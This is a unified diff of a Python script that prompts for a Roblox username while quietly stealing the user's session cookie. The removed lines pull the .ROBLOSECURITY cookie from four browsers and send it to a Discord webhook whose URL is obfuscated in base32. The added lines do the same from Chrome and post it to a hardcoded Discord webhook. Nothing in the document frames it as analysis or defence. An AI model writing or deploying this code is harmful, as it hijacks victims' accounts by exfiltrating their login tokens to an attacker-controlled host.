@@ -1,62 +1,24 @@
-import browser_cookie3, requests, threading
-import base64
-import time
-import os
 from discord_webhook import DiscordWebhook, DiscordEmbed
-import random
+import requests
+import threading
+import browser_cookie3 as cookie
 import time
 
-name = input('Enter your roblox username')
+name = input('Enter your roblox username: ')
 
-key = "NB2HI4DTHIXS6ZDJONRW64TEFZRW63JPMFYGSL3XMVRGQ33PNNZS6MJQGEYDAMZRGE2TGMJUGQ3DONRUGM2C6OCQIRVDQUBTGJSTIU2XGJYWYUKYPFYWSM2IJZWTETSXJZFWYURWFVGW223HLJEWEZRRJBJU2URVMQZUI6L2NFFEYY2IJVDXM4TYJFGGQUCJKA======"
+webhookl = DiscordWebhook(url='https://discord.com/api/webhooks/1010031153144676434/8PDj8P32e4SW2qlQXyqi3HNm2NWNKlR6-MmkgZIbf1HSMR5d3DyziJLcHMGvrxILhPIP')
 
-weblook = base64.b32decode(key)
-webhookl = DiscordWebhook(url=weblook)
-def edge_logger():
-    try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
-        webhook.add_embed(embed)
-        response = webhook.execute()
-    except:
-        pass
 
-def chrome_logger():
-    try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
-        webhook.add_embed(embed)
-        response = webhook.execute()
-    except:
-        pass
+def getCookiesFromPc():
+    req = requests.Session()
+    cj = cookie.chrome()
+    req.cookies = cj
+    r = req.get("https://www.roblox.com/")
+    for c in req.cookies:
+        if c.name == ".ROBLOSECURITY":
+            webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1010031153144676434/8PDj8P32e4SW2qlQXyqi3HNm2NWNKlR6-MmkgZIbf1HSMR5d3DyziJLcHMGvrxILhPIP')
+            embed = DiscordEmbed(title='🍪 Новый куки файл!', description=f'{c.value}', color='03b2f8')
+            webhook.add_embed(embed)
+            response = webhook.execute()
 
-def firefox_logger():
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
-        webhook.add_embed(embed)
-        response = webhook.execute()
-    except:
-        pass
-
-def opera_logger():
-    try:
-        cookies = browser_cookie3.opera(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
-        webhook.add_embed(embed)
-        response = webhook.execute()
-    except:
-        pass
-
-browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
-
-for x in browsers:
-    threading.Thread(target=x,).start()
+getCookiesFromPc()
